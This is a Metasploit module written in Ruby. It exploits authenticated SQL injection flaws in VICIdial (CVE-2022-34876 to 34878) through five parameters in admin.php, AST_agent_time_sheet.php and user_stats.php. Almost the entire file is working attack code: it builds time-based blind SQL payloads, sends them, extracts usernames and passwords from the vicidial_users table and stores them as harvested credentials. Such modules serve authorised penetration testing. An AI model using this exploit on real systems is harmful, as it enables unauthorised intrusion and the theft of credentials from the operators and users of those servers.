##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VICIdial Multiple Authenticated SQLi',
        'Description' => %q{
          This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to
          svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable).
          Injection point 1 is on vicidial/admin.php when adding a user, in the modify_email_accounts parameter.
          Injection point 2 is on vicidial/admin.php when adding a user, in the access_recordings parameter.
          Injection point 3 is on vicidial/admin.php when adding a user, in the agentcall_email parameter.
          Injection point 4 is on vicidial/AST_agent_time_sheet.php when adding a user, in the agent parameter.
          Injection point 5 is on vicidial/user_stats.php when adding a user, in the file_download parameter.
          VICIdial does not encrypt passwords by default.
        },
        'Author' => [
          'h00die' # msf module, discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://www.vicidial.org/VICIDIALforum/viewtopic.php?f=4&t=41300&sid=aacb27a29fefd85265b4d55fe51122af'],
          [ 'CVE', '2022-34876'], # admin.php
          [ 'CVE', '2022-34877'], # AST_agent_time_sheet.php
          [ 'CVE', '2022-34878'] # user_stats.php
        ],
        'Actions' => [
          ['List Users - modify_email_accounts method', { 'Description' => 'Queries username, password for COUNT users' }],
          ['List Users - access_recordings method', { 'Description' => 'Queries username, password for COUNT users' }],
          ['List Users - agentcall_email method', { 'Description' => 'Queries username, password for COUNT users' }],
          ['List Users - agent_time_sheet method', { 'Description' => 'Queries username, password for COUNT users' }],
          ['List Users - user_stats method', { 'Description' => 'Queries username, password for COUNT users' }],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2022-04-19',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Valid Username for login', '6666']),
      OptString.new('PASSWORD', [true, 'Valid Password for login', '']),
      OptString.new('ACTION', [true, 'Valid Password for login', 'List Users - access_recordings method'])
    ]
  end

  def post_4a
    {
      'ADD' => '4A',
      'custom_fields_modify' => '0',
      'user' => '111',
      'pass' => '111',
      'force_change_password' => 'N',
      'full_name' => '111',
      'user_level' => '1',
      'user_group' => 'ADMIN',
      'phone_login' => '111',
      'phone_pass' => '111',
      'active' => 'Y',
      'voicemail_id' => '',
      'email' => '',
      'mobile_number' => '',
      'user_code' => '',
      'user_location' => '',
      'territory' => '',
      'user_nickname' => '',
      'user_new_lead_limit' => '-1',
      'agent_choose_ingroups' => '1',
      'agent_choose_blended' => '1',
      'hotkeys_active' => '0',
      'scheduled_callbacks' => '1',
      'agentonly_callbacks' => '0',
      'next_dial_my_callbacks' => 'NOT_ACTIVE',
      'agentcall_manual' => '0',
      'manual_dial_filter' => 'DISABLED',
      'agentcall_email' => '0',
      'agentcall_chat' => '0',
      'vicidial_recording' => '1',
      'vicidial_transfers' => '1',
      'closer_default_blended' => '0',
      'user_choose_language' => '0',
      'selected_language' => 'defaultEnglish',
      'vicidial_recording_override' => 'DISABLED',
      'mute_recordings' => 'DISABLED',
      'alter_custdata_override' => 'NOT_ACTIVE',
      'alter_custphone_override' => 'NOT_ACTIVE',
      'agent_shift_enforcement_override' => 'DISABLED',
      'agent_call_log_view_override' => 'DISABLED',
      'hide_call_log_info' => 'DISABLED',
      'agent_lead_search' => 'NOT_ACTIVE',
      'lead_filter_id' => 'NONE',
      'user_hide_realtime' => '0',
      'allow_alerts' => '0',
      'preset_contact_search' => 'NOT_ACTIVE',
      'max_inbound_calls' => '0',
      'max_inbound_filter_enabled' => '0',
      'max_inbound_filter_min_sec' => '-1',
      'max_hopper_calls' => '0',
      'max_hopper_calls_hour' => '0',
      'wrapup_seconds_override' => '-1',
      'ready_max_logout' => '-1',
      'status_group_id' => '',
      'custom_one' => '',
      'custom_two' => '',
      'custom_three' => '',
      'custom_four' => '',
      'custom_five' => '',
      'qc_enabled' => '0',
      'qc_user_level' => '1',
      'qc_pass' => '0',
      'qc_finish' => '0',
      'qc_commit' => '0',
      'realtime_block_user_info' => '0',
      'admin_hide_lead_data' => '0',
      'admin_hide_phone_data' => '0',
      'ignore_group_on_search' => '0',
      'user_admin_redirect_url' => '',
      'view_reports' => '0',
      'access_recordings' => '0',
      'alter_agent_interface_options' => '0',
      'modify_users' => '0',
      'change_agent_campaign' => '0',
      'delete_users' => '0',
      'modify_usergroups' => '0',
      'delete_user_groups' => '0',
      'modify_lists' => '0',
      'delete_lists' => '0',
      'load_leads' => '0',
      'modify_leads' => '0',
      'export_gdpr_leads' => '0',
      'download_lists' => '0',
      'export_reports' => '0',
      'delete_from_dnc' => '0',
      'modify_campaigns' => '0',
      'campaign_detail' => '0',
      'delete_campaigns' => '0',
      'modify_ingroups' => '0',
      'delete_ingroups' => '0',
      'modify_inbound_dids' => '0',
      'delete_inbound_dids' => '0',
      'modify_custom_dialplans' => '0',
      'modify_remoteagents' => '0',
      'delete_remote_agents' => '0',
      'modify_scripts' => '0',
      'delete_scripts' => '0',
      'modify_filters' => '0',
      'delete_filters' => '0',
      'ast_admin_access' => '0',
      'ast_delete_phones' => '0',
      'modify_call_times' => '0',
      'delete_call_times' => '0',
      'modify_servers' => '0',
      'modify_shifts' => '0',
      'modify_phones' => '0',
      'modify_carriers' => '0',
      'modify_email_accounts' => '0',
      'vKik' => 'vKik',
      'modify_labels' => '0',
      'modify_colors' => '0',
      'modify_languages' => '0',
      'modify_statuses' => '0',
      'modify_voicemail' => '0',
      'modify_audiostore' => '0',
      'modify_moh' => '0',
      'modify_tts' => '0',
      'modify_contacts' => '0',
      'callcard_admin' => '0',
      'modify_auto_reports' => '0',
      'add_timeclock_log' => '0',
      'modify_timeclock_log' => '0',
      'delete_timeclock_log' => '0',
      'manager_shift_enforcement_override' => '0',
      'pause_code_approval' => '0',
      'admin_cf_show_hidden' => '0',
      'modify_ip_lists' => '0',
      'ignore_ip_list' => '0',
      'two_factor_override' => 'NOT_ACTIVE',
      'vdc_agent_api_access' => '0',
      'api_list_restrict' => '0',
      'api_allowed_functions[]' => 'ALL_FUNCTIONS',
      'api_only_user' => '0',
      'modify_same_user_level' => '1',
      'alter_admin_interface_options' => '1',
      'SUBMIT' => 'SUBMIT'
    }
  end

  def basic_auth
    user_pass = "#{datastore['USERNAME']}:#{datastore['PASSWORD']}"
    {
      'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
    }
  end

  def inject_admin_page(param, payload)
    data = post_4a
    d = Rex::Text.rand_text_numeric(4)
    data[param] = "0' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}"
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'vicidial', 'admin.php'),
      'headers' => basic_auth,
      'vars_post' => data
    })

    fail_with Failure::Unreachable, 'Connection failed' unless res
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'vicidial', 'admin.php'),
      'headers' => basic_auth
    })

    fail_with(Failure::Unreachable, 'Failed to load website') unless res
    fail_with(Failure::NoAccess, 'Invalid login/password') if res.code == 401
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      d = Rex::Text.rand_text_numeric(4)
      if datastore['ACTION'] == 'List Users - modify_email_accounts method'
        inject_admin_page('modify_email_accounts', payload)
      elsif datastore['ACTION'] == 'List Users - access_recordings method'
        inject_admin_page('access_recordings', payload)
      elsif datastore['ACTION'] == 'List Users - agentcall_email method'
        inject_admin_page('agentcall_email', payload)
      elsif datastore['ACTION'] == 'List Users - agent_time_sheet method'
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'vicidial', 'AST_agent_time_sheet.php'),
          'headers' => basic_auth,
          'vars_get' => {
            'agent' => "0' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}"
          }
        })
      elsif datastore['ACTION'] == 'List Users - user_stats method'
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'vicidial', 'user_stats.php'),
          'headers' => basic_auth,
          'vars_get' => {
            'DB' => '',
            'pause_code_rpt' => '',
            'park_rpt' => '1',
            'did_id' => '',
            'did' => '',
            'begin_date' => Date.today.to_s,
            'end_date' => Date.today.to_s,
            'user' => '',
            'submit' => 'submit',
            'search_archived_data' => '',
            'NVAuser' => '',
            'file_download' => "1' AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND '#{d}'='#{d}"
          }
        })
      end
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user', 'pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('vicidial_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'vicidial_users', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :password,
        private_data: user[1],
        service_name: 'VICIdial',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)
  end
end
